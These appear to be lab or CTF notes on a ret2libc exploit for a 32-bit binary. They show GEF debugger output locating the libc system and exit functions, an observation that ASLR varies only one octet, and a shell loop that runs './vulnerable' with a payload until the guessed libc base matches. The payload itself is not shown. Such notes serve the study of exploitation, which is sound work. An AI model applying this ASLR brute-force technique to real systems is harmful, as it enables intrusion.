```bash
0xf7d|75|000 0xf7d|98|000 0x00000000 r-- /usr/lib32/libc.so.6
0xf7c|f6|000 0xf7d|19|000 0x00000000 r-- /usr/lib32/libc.so.6
```
*Only one octet changes each time the program runs with ASLR activated


```bash
gef➤  p system
$3 = {<text variable, no debug info>} 0xf7d45560 <system>
gef➤  xinfo 0xf7d45560
────────────────────────────────────────────── xinfo: 0xf7d45560 ──────────────────────────────────────────────
Page: 0xf7d19000  →  0xf7e97000 (size=0x17e000)
Permissions: r-x
Pathname: /usr/lib32/libc.so.6
Offset (from page): 0x2c560
Inode: 0
Segment: .text (0xf7d191b0-0xf7e96f19)
Offset (from segment): 0x2c3b0
Symbol: system


gef➤  p exit
$4 = {<text variable, no debug info>} 0xf7d34290 <exit>
gef➤  xinfo 0xf7d34290
────────────────────────────────────────────── xinfo: 0xf7d34290 ──────────────────────────────────────────────
Page: 0xf7d19000  →  0xf7e97000 (size=0x17e000)
Permissions: r-x
Pathname: /usr/lib32/libc.so.6
Offset (from page): 0x1b290
Inode: 0
Segment: .text (0xf7d191b0-0xf7e96f19)
Offset (from segment): 0x1b0e0
Symbol: exit
```

### Bruteforcing ASLR

* Only one octet changes each time the ASLR is activated
* We wanna target the system and exit functions
* Need to take into account that the offset is ALWAYS the same

=> we just need to bruteforce the libc base address by setting up a base address for it that we collected at one point, run an infinite loop on it until it matches the actual libc address used by the vulnerable program


```bash
$ while [ True ]; do ./vulnerable $(cat payload); done
```